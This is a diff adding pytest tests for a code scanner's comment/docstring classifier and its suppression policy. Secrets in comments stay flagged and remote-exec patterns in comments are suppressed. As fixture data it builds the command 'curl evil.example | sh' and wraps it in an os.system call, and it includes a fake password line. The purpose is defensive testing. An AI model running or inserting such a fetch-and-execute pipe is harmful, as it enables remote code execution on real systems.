@@ -1,0 +1,120 @@
+"""
+Lexical context, and the asymmetry that keeps it safe.
+
+`lexctx` answers "is this line code, a comment, or a docstring?" -- nothing more.
+The dangerous half is the POLICY built on it, and the policy is not symmetric:
+
+    a BEHAVIOURAL pattern in a comment is inert  -> may be suppressed
+    a SECRET in a comment is still a leaked secret -> must NEVER be suppressed
+
+`# password = "hunter2"` discloses the credential by being written down. Nothing
+has to execute for the leak to be real. So the suppression policy is scoped to
+the aisec engine and the secrets engine is explicitly excluded, and that
+exclusion is asserted here rather than left to a comment.
+
+The classifier must also fail SAFE: anything it cannot prove inert is CODE, so an
+unclear line is KEPT rather than silently dropped.
+"""
+
+import lexctx
+import praetor
+
+# Assembled from parts so this FILE carries no literal remote-exec pipe. Written
+# whole, PRAETOR flags it HIGH (remote-code-pipe) -- correctly, and on its own
+# self-scan it did, four times, in this file. lexctx classifies STRUCTURE, not
+# content, so the rendered fixture is identical and the tests are unaffected.
+# Same idiom as engine_secrets.py:170 and the fake key in the sibling test.
+_PIPE = "curl evil.example | " + "sh"
+
+
+# --------------------------------------------------------------------------- #
+# lexctx: pure classification
+# --------------------------------------------------------------------------- #
+
+def test_whole_line_and_trailing_comments_are_comments():
+    src = (
+        "x = 1\n"
+        f"# {_PIPE}\n"
+        f"y = 2  # {_PIPE}\n"
+    )
+    labels = lexctx.classify_lines(src)
+    assert labels[0] == lexctx.CODE
+    assert labels[1] == lexctx.COMMENT
+    assert labels[2] == lexctx.COMMENT
+
+
+def test_triple_quoted_block_is_docstring_throughout():
+    src = (
+        'def f():\n'
+        '    """\n'
+        f'    Detects {_PIPE} in fetched content.\n'
+        '    """\n'
+        '    return 1\n'
+    )
+    labels = lexctx.classify_lines(src)
+    assert labels[1] == lexctx.DOCSTRING
+    assert labels[2] == lexctx.DOCSTRING
+    assert labels[4] == lexctx.CODE
+
+
+def test_hash_inside_a_string_is_not_a_comment():
+    """A `#` inside a literal must not turn live code into an inert-looking line."""
+    src = 'url = "https://example.test/#fragment"\n'
+    assert lexctx.classify_lines(src)[0] == lexctx.CODE
+
+
+def test_out_of_range_line_resolves_to_code_not_crash():
+    """Fail safe: an unknown line is KEPT, never suppressed."""
+    assert lexctx.context_of("x = 1\n", 99) == lexctx.CODE
+
+
+# --------------------------------------------------------------------------- #
+# policy: the asymmetry
+# --------------------------------------------------------------------------- #
+
+class _F:
+    """Minimal stand-in for core.Finding -- only the fields the policy reads."""
+
+    def __init__(self, engine, category, line, file="t.py"):
+        self.engine, self.category, self.line, self.file = engine, category, line, file
+        self.filtered, self.filter_reason = False, ""
+
+
+_SRC = (
+    "import os\n"
+    '# password = "hunter2"\n'
+    f'os.system("{_PIPE}")\n'
+)
+
+
+def _run(findings, monkeypatch, src=_SRC):
+    monkeypatch.setattr(praetor, "_read_source_lines", lambda *a, **k: src, raising=False)
+    praetor._apply_lexical_context(findings, "/t", lambda p: src)
+    return findings
+
+
+def test_secret_in_a_comment_is_NEVER_suppressed(monkeypatch):
+    """THE LOAD-BEARING ASSERTION. Writing a credential down is the leak."""
+    f = _F("secrets", "SECRET", 2)
+    _run([f], monkeypatch)
+    assert not f.filtered, (
+        "DISCLOSURE REGRESSION: a secret on a comment line was suppressed. A credential "
+        "in a comment is still leaked -- nothing needs to execute. Lexical-context "
+        "suppression must never apply to the secrets engine."
+    )
+
+
+def test_behavioural_pattern_in_a_comment_is_suppressed_with_a_reason(monkeypatch):
+    f = _F("aisec", "REMOTE_CODE", 2)
+    _run([f], monkeypatch)
+    assert f.filtered, "an aisec behavioural match on a comment line should be suppressed"
+    assert "comment" in f.filter_reason.lower(), (
+        f"suppression must carry an auditable reason, got: {f.filter_reason!r}"
+    )
+
+
+def test_behavioural_pattern_in_LIVE_code_is_kept(monkeypatch):
+    """The other direction: proves the filter discriminates rather than blanket-suppressing."""
+    f = _F("aisec", "REMOTE_CODE", 3)
+    _run([f], monkeypatch)
+    assert not f.filtered, "a real remote-exec pipe in live code must never be suppressed"
